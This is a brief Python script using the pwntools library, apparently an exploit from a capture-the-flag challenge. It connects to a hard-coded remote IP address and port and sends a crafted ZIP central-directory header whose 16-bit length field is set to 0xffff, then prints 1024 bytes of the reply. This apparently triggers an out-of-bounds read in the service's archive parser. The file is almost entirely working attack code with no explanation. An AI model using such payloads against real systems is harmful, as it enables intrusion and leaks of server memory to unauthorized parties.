from pwn import *

r = remote("159.203.87.2", 8888)
#r = remote("localhost", 8888)

#header
payload = "PK\x01\x02"

#padding
payload += "a" * (28 - len(payload))

#length
payload += p16(0xffff)

#padding
payload += "b" * 19

r.send(payload)
print r.recvn(1024)
